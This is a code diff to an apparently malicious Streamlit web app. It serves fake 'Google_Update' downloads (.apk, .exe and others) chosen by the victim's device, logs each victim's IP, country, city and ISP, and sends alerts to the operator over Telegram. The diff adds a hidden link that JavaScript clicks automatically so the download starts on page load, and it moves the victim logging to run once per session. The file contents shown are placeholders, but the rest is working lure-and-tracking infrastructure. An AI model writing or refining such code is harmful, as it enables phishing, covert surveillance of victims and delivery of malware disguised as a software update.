@@ -31,7 +31,8 @@ except ImportError:
 from utils import (
     send_telegram_alert, log_victim, get_all_victims, clear_victims_log,
     get_server_side_ip, get_geo_data, validate_ip, validate_domain,
-    validate_email, validate_phone, safe_request, format_json, format_table
+    validate_email, validate_phone, safe_request, format_json, format_table,
+    get_user_agent, detect_device_from_user_agent
 )
 
 # استيراد مساعد الهجوم الذكي
@@ -156,12 +157,7 @@ if "download" in query_params:
     device = query_params.get("device", "pc")
     ip = query_params.get("ip", get_server_side_ip())
     
-    send_telegram_alert(ip, f"Download ({device})", device)
-    
-    # تسجيل الضحية
-    geo_data = get_geo_data(ip)
-    log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
-    
+    # تحديد اسم الملف بناءً على الجهاز
     if device == "android":
         file_name = "Google_Update.apk"
         content = b"Fake APK Content for Google Update"
@@ -209,10 +205,31 @@ if "download" in query_params:
 </dict>
 </plist>""".encode('utf-8')
     else:
-        file_name = "Google_Update.py"
-        content = b"print('Google Update Service Started...')"
-            
-    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream", key="download_btn")
+        file_name = "Google_Update.exe"
+        content = b"Fake Windows Content for Google Update"
+
+    # إرسال تنبيه Telegram عند بدء التحميل
+    if "download_alert_sent" not in st.session_state:
+        send_telegram_alert(ip, f"Download Attempt ({device})", device, file_name)
+        
+        # تسجيل الضحية
+        geo_data = get_geo_data(ip)
+        log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
+        st.session_state.download_alert_sent = True
+    
+    # عرض زر التحميل التلقائي باستخدام JavaScript
+    st.markdown(f"""
+        <div style='text-align: center; margin-top: 30vh;'>
+            <h2>جاري تحضير الملف...</h2>
+            <p>سيتم بدء التحميل تلقائياً خلال ثوانٍ</p>
+            <a id='download_link' href='data:application/octet-stream;base64,{base64.b64encode(content).decode()}' download='{file_name}' style='display: none;'>Download</a>
+            <script>
+                setTimeout(function() {{
+                    document.getElementById('download_link').click();
+                }}, 1000);
+            </script>
+        </div>
+    """, unsafe_allow_html=True)
     st.stop()
 
 # ============= نظام المصادقة =============
